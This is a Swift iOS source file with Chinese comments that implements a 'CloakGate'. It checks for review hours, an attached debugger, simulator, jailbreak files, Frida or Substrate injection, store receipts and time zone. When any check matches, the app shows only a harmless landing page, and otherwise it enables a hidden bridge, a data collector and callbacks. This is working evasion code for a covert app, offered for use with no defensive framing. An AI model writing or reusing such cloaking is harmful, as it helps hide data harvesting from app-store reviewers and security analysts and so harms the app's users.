import UIKit
import Darwin

// 审核期 / 分析环境分流（第 32 类 §6）
// 命中任一条件 → 只加载正常落地页、不挂桥、不启采集器、不发回传。

final class CloakGate {
    let isLive: Bool

    init() {
        var live = true

        // 1. 时间窗：审核时段（可下发配置热更新，此处给静态默认）
        let hr = Calendar.current.component(.hour, from: Date())
        if hr >= 1 && hr <= 6 { live = false }                   // 目标时区活跃窗之外

        // 2. 调试器附着：sysctl CTL_KERN/KERN_PROC/KERN_PROC_PID → P_TRACED
        if Self.isDebugged() { live = false }

        // 3. 模拟器 / 越狱 / 注入框架
        if Self.isSimulator() { live = false }
        if Self.hasJailbreakFiles() { live = false }
        if Self.hasInjectedDylibs() { live = false }

        // 4. 安装来源：TestFlight / App Store 收据存在 → 审核态
        if Self.hasStoreReceipt() { live = false }

        // 5. 地域/语言/机型分流（占位，接服务端下发规则表）
        let tz = TimeZone.current.identifier
        if tz == "Antarctica/Troll" { live = false }

        isLive = live
    }

    static func isDebugged() -> Bool {
        var info = kinfo_proc()
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]
        var size = MemoryLayout<kinfo_proc>.stride
        return sysctl(&mib, UInt32(mib.count), &info, &size, nil, 0) == 0
            && (info.kp_proc.p_flag & P_TRACED) != 0
    }

    static func isSimulator() -> Bool {
        #if targetEnvironment(simulator)
        return true
        #else
        return false
        #endif
    }

    static func hasJailbreakFiles() -> Bool {
        let paths = ["/Applications/Cydia.app", "/usr/sbin/sshd", "/bin/bash",
                     "/etc/apt", "/Library/MobileSubstrate/MobileSubstrate.dylib",
                     "/private/var/lib/apt/"]
        return paths.contains { FileManager.default.fileExists(atPath: $0) }
    }

    static func hasInjectedDylibs() -> Bool {
        let suspicious = ["FridaGadget", "frida", "SSLKillSwitch", "Substrate",
                          "cycript", "libspark"]
        let n = _dyld_image_count()
        for i in 0..<n {
            if let c = _dyld_get_image_name(i) {
                let s = String(cString: c).lowercased()
                if suspicious.contains(where: { s.contains($0.lowercased()) }) { return true }
            }
        }
        return false
    }

    static func hasStoreReceipt() -> Bool {
        guard let u = Bundle.main.appStoreReceiptURL else { return false }
        return FileManager.default.fileExists(atPath: u.path)
    }
}
